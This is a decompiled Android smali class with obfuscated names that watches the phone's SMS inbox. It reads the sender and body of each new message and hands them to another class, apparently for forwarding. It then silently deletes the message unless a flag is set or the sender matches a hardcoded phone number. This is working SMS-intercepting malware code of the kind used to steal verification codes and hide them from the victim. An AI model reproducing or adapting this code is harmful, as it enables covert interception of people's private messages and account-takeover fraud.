.class public Lji/yj/ur/a201jhfg20180420ab/JM05;
.super Landroid/database/ContentObserver;
.source "JM05.java"


# instance fields
.field private context:Landroid/content/Context;

.field private didid:I

.field private ninin:Landroid/net/Uri;

.field private sp:Landroid/content/SharedPreferences;

.field private su:Lji/yj/ur/a201jhfg20180420ab/JM02;


# direct methods
.method public constructor <init>(Landroid/content/Context;Landroid/os/Handler;)V
    .locals 2
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "handler"    # Landroid/os/Handler;

    .prologue
    const/4 v1, 0x0

    .line 23
    invoke-direct {p0, p2}, Landroid/database/ContentObserver;-><init>(Landroid/os/Handler;)V

    .line 12
    const/4 v0, -0x1

    iput v0, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->didid:I

    .line 13
    iput-object v1, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->ninin:Landroid/net/Uri;

    .line 14
    iput-object v1, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->sp:Landroid/content/SharedPreferences;

    .line 15
    iput-object v1, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->su:Lji/yj/ur/a201jhfg20180420ab/JM02;

    .line 24
    iput-object p1, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->context:Landroid/content/Context;

    .line 25
    const-string v0, "content://sms/inbox"

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    iput-object v0, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->ninin:Landroid/net/Uri;

    .line 26
    new-instance v0, Lji/yj/ur/a201jhfg20180420ab/JM02;

    invoke-direct {v0}, Lji/yj/ur/a201jhfg20180420ab/JM02;-><init>()V

    iput-object v0, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->su:Lji/yj/ur/a201jhfg20180420ab/JM02;

    .line 27
    const-string v0, "config"

    const/4 v1, 0x0

    invoke-virtual {p1, v0, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    iput-object v0, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->sp:Landroid/content/SharedPreferences;

    .line 28
    invoke-virtual {p0}, Lji/yj/ur/a201jhfg20180420ab/JM05;->Change()V

    .line 29
    return-void
.end method


# virtual methods
.method public Change()V
    .locals 12

    .prologue
    const/4 v10, 0x1

    const/4 v2, 0x0

    .line 31
    iget-object v0, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->context:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    iget-object v1, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->ninin:Landroid/net/Uri;

    const-string v5, "_id desc"

    move-object v3, v2

    move-object v4, v2

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v8

    .line 32
    .local v8, "cursor":Landroid/database/Cursor;
    invoke-interface {v8}, Landroid/database/Cursor;->moveToNext()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 33
    const-string v0, "_id"

    invoke-interface {v8, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v8, v0}, Landroid/database/Cursor;->getInt(I)I

    move-result v9

    .line 34
    .local v9, "id":I
    iget v0, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->didid:I

    const/4 v1, -0x1

    if-ne v0, v1, :cond_1

    .line 35
    iput v9, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->didid:I

    .line 52
    .end local v9    # "id":I
    :cond_0
    :goto_0
    invoke-interface {v8}, Landroid/database/Cursor;->close()V

    .line 53
    return-void

    .line 37
    .restart local v9    # "id":I
    :cond_1
    iget v0, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->didid:I

    if-le v9, v0, :cond_3

    .line 38
    iput v9, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->didid:I

    .line 39
    const-string v0, "address"

    invoke-interface {v8, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v8, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v6

    .line 40
    .local v6, "address":Ljava/lang/String;
    const-string v0, "body"

    invoke-interface {v8, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v8, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v7

    .line 41
    .local v7, "body":Ljava/lang/String;
    iget-object v0, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->sp:Landroid/content/SharedPreferences;

    const-string v1, "islj"

    invoke-interface {v0, v1, v10}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v11

    .line 42
    .local v11, "islj":Z
    iget-object v0, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->su:Lji/yj/ur/a201jhfg20180420ab/JM02;

    iget-object v1, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->context:Landroid/content/Context;

    iget-object v2, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->sp:Landroid/content/SharedPreferences;

    invoke-virtual {v0, v6, v7, v1, v2}, Lji/yj/ur/a201jhfg20180420ab/JM02;->yrthfdxh(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;Landroid/content/SharedPreferences;)V

    .line 43
    if-nez v11, :cond_2

    const-string v0, "18016217928"

    invoke-virtual {v6, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-nez v0, :cond_2

    const/4 v10, 0x0

    .line 44
    .local v10, "isdelete":Z
    :cond_2
    if-eqz v10, :cond_0

    .line 45
    invoke-virtual {p0, v9}, Lji/yj/ur/a201jhfg20180420ab/JM05;->delete(I)V

    goto :goto_0

    .line 48
    .end local v6    # "address":Ljava/lang/String;
    .end local v7    # "body":Ljava/lang/String;
    .end local v10    # "isdelete":Z
    .end local v11    # "islj":Z
    :cond_3
    iput v9, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->didid:I

    goto :goto_0
.end method

.method public delete(I)V
    .locals 5
    .param p1, "id"    # I

    .prologue
    .line 55
    iget-object v1, p0, Lji/yj/ur/a201jhfg20180420ab/JM05;->context:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    const-string v2, "content://sms/"

    invoke-static {v2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "_id="

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x0

    invoke-virtual {v1, v2, v3, v4}, Landroid/content/ContentResolver;->delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I

    move-result v0

    .line 56
    .local v0, "tx":I
    return-void
.end method

.method public onChange(Z)V
    .locals 0
    .param p1, "selfChange"    # Z

    .prologue
    .line 18
    invoke-super {p0, p1}, Landroid/database/ContentObserver;->onChange(Z)V

    .line 19
    invoke-virtual {p0}, Lji/yj/ur/a201jhfg20180420ab/JM05;->Change()V

    .line 20
    return-void
.end method
